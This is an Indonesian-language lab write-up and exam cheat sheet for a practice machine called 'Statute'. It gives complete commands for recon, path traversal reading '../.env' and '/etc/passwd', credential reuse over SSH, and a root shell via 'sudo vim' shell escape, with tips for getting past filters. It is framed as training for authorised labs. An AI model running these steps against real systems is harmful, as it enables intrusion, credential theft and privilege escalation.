# Write-Up Lab Statute — Panduan Ujian Close Book

> **Ruang lingkup:** hanya untuk laboratorium atau sistem yang telah memberikan izin pengujian.

## 0. Cara Menggunakan Catatan Ini

Pelajari dokumen ini dalam tiga lapisan:

```text
Lapisan 1: hafalkan rantai serangan dan mnemonic.
Lapisan 2: hafalkan indikator berhasil pada setiap fase.
Lapisan 3: latih command pada Cheat Sheet 60 Detik.
```

---

## 1. Peta Serangan

| Komponen | Nilai |
|---|---|
| Target | `192.168.56.120` |
| Web | `http://192.168.56.120:8080` |
| Celah awal | Path Traversal pada parameter `file` |
| Data ditemukan | Credential pada `.env` |
| Foothold | SSH sebagai `operator` |
| Privilege escalation | `sudo vim` |
| Akses akhir | `root` |

### Rantai Serangan

```text
Recon
→ temukan endpoint download
→ buat baseline
→ ../.env
→ credential operator
→ SSH
→ sudo -l
→ Vim shell escape
→ root
```

### Mnemonic: R-D-T-S-V-R

```text
R = Recon
D = Download
T = Traversal
S = SSH
V = Vim
R = Root
```

### Checkpoint Ujian

| Fase | Indikator yang Dicari |
|---|---|
| Recon | Port `22` dan `8080`, endpoint download |
| Baseline | File valid `200`, file tidak ada `404` |
| Traversal | Isi `.env` dapat dibaca |
| SSH | Login sebagai `operator` |
| Sudo | `(root) /usr/bin/vim` |
| Root | `uid=0(root)` dan `whoami` menghasilkan `root` |

---

# Fase 1 — Recon dan Endpoint Download

## 2. Tujuan

Menemukan service web, SSH, dan parameter yang menerima nama file.

## 3. Scan Service

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"

nmap -Pn -sC -sV -p22,80,8080 "$TARGET"
```

Indikator:

```text
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http
```

Catat SSH, tetapi jangan menebak password. Credential dicari dari aplikasi web.

## 4. Directory Enumeration

```bash
dirsearch \
  -u "$WEB" \
  -e php,html,txt,bak,env
```

Endpoint penting:

```text
/download
/download.php
/documents
```

Klik tombol download normal dan amati request melalui Burp Suite atau Developer Tools.

Contoh:

```http
GET /download?file=uu-1-2024.pdf HTTP/1.1
Host: 192.168.56.120:8080
```

Petunjuk utama:

```text
Parameter file menerima nama file secara langsung.
```

---

# Fase 2 — Baseline dan Path Traversal

## 5. Tujuan

Membedakan respons normal, file tidak ditemukan, dan traversal berhasil.

## 6. Baseline File Valid

```bash
curl --path-as-is -i \
  "$WEB/download?file=uu-1-2024.pdf"
```

Indikator:

```text
HTTP/1.1 200 OK
Content-Type: application/pdf
```

## 7. Baseline File Tidak Ada

```bash
curl --path-as-is -i \
  "$WEB/download?file=missing.pdf"
```

Indikator:

```text
HTTP/1.1 404 Not Found
```

## 8. Membaca `.env`

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"
```

Indikator berhasil:

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=".env"

DB_USERNAME=operator
DB_PASSWORD=<PASSWORD_DARI_ENV>
DB_DATABASE=jdih
```

Mengapa berhasil:

```text
documents/../.env
↓
.env pada root aplikasi
```

Temuan ini membuktikan:

```text
Path Traversal / Arbitrary File Read
```

Validasi tambahan yang cukup:

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../../../../../etc/passwd"
```

> Hentikan setelah bukti minimum diperoleh. Tidak perlu membaca `/etc/shadow`, private key, atau data sensitif lain.

---

# Fase 3 — Credential Reuse ke SSH

## 9. Tujuan

Menguji apakah credential aplikasi juga digunakan untuk akun sistem.

## 10. Hubungkan Temuan

```text
Nmap menemukan SSH
+
.env menemukan username dan password
=
uji credential reuse pada SSH
```

Login:

```bash
ssh operator@"$TARGET"
```

Masukkan password yang ditemukan pada `DB_PASSWORD`.

Verifikasi:

```bash
whoami
id
hostname
pwd
```

Indikator:

```text
operator
statute
/home/operator
```

---

# Fase 4 — Enumerasi Sudo

## 11. Tujuan

Mencari program yang dapat dijalankan sebagai root.

## 12. Periksa Hak Sudo

```bash
sudo -l
```

Temuan lab:

```text
(root) /usr/bin/vim
```

atau:

```text
(root) NOPASSWD: /usr/bin/vim
```

Mengapa berbahaya:

```text
Vim mendukung shell escape.
Program berjalan sebagai root.
Shell yang dibuka dari Vim ikut berjalan sebagai root.
```

### Rumus Hafalan

```text
sudo editor + shell escape = root shell
```

---

# Fase 5 — Root melalui Vim

## 13. Tujuan

Menggunakan shell escape Vim untuk membuka shell root.

## 14. Cara Singkat

```bash
sudo vim -c ':!/bin/sh'
```

Verifikasi:

```bash
whoami
id
```

Indikator:

```text
root
uid=0(root) gid=0(root)
```

## 15. Cara Interaktif

```bash
sudo vim
```

Di dalam Vim:

```vim
:!/bin/sh
```

Keluar dari shell:

```bash
exit
```

Keluar dari Vim tanpa menyimpan:

```vim
:q!
```

---

# 16. Troubleshooting Inti

### `/download` menghasilkan `400`

Parameter `file` kemungkinan wajib diisi. Lihat request download normal dari browser.

### `../.env` menghasilkan `403`

Tambahkan User-Agent browser:

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"
```

### `../.env` menghasilkan `404`

Coba kedalaman terbatas berdasarkan struktur aplikasi:

```text
../../.env
```

Apabila normalisasi URL terjadi, uji encoding secara terbatas:

```text
..%2F.env
```

### `sudo vim -c ':!/bin/sh'` langsung keluar

Gunakan cara interaktif:

```bash
sudo vim
```

Kemudian:

```vim
:!/bin/bash
```

> Jangan melakukan brute force path tanpa arah. Gunakan struktur aplikasi dan perbedaan respons baseline sebagai petunjuk.

---

# 17. Cleanup

Lab ini tidak mengubah file aplikasi saat eksploitasi utama.

Pastikan:

```text
1. Tidak ada file tambahan yang dibuat.
2. Tidak ada perubahan konfigurasi Vim.
3. Sesi root dan SSH telah ditutup.
```

---

# 18. Cheat Sheet 60 Detik

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"

# 1. Recon
nmap -Pn -sC -sV -p22,80,8080 "$TARGET"
dirsearch -u "$WEB" -e php,html,txt,bak,env

# 2. Baseline
curl --path-as-is -i "$WEB/download?file=uu-1-2024.pdf"
curl --path-as-is -i "$WEB/download?file=missing.pdf"

# 3. Traversal
curl --path-as-is -i \
-H 'User-Agent: Mozilla/5.0' \
"$WEB/download?file=../.env"

# 4. SSH
ssh operator@"$TARGET"

# 5. Sudo dan root
sudo -l
sudo vim -c ':!/bin/sh'
id
whoami
```

---

# 19. Checklist Ujian

```text
[ ] Port SSH dan web ditemukan
[ ] Endpoint download ditemukan
[ ] Request normal dengan parameter file dipahami
[ ] Baseline 200 dan 404 dibuat
[ ] .env berhasil dibaca
[ ] Credential operator diperoleh
[ ] SSH berhasil
[ ] sudo -l diperiksa
[ ] sudo vim ditemukan
[ ] shell escape dijalankan
[ ] uid=0(root) terbukti
[ ] Sesi ditutup
```

## Kalimat Hafalan

```text
Temukan download, pahami parameter file, buat baseline,
baca ../.env, login operator, cek sudo, escape dari Vim, root.
```
